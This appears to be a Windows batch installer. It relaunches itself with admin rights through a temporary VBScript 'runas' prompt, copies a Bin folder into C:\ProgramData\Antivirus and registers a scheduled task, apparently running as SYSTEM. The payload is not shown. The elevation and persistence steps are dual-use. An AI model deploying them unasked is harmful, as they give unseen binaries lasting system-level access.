@echo off

:: Step 1: Elevate
>nul 2>&1 fsutil dirty query %systemdrive% || echo CreateObject^("Shell.Application"^).ShellExecute "%~0", "ELEVATED", "", "runas", 1 > "%temp%\uac.vbs" && "%temp%\uac.vbs" && exit /b
DEL /F /Q "%temp%\uac.vbs"

:: Step 2: Initialize environment
setlocal EnableExtensions EnableDelayedExpansion

:: Step 3: Move to the script directory
cd /d %~dp0
cd Bin

:: Step 4: Copy to the install location
md C:\ProgramData\Antivirus
copy "*.*" "C:\ProgramData\Antivirus\"
schtasks /create /tn "Antivirus" /xml "Antivirus.xml" /ru ""

echo Script completed successfully.
exit
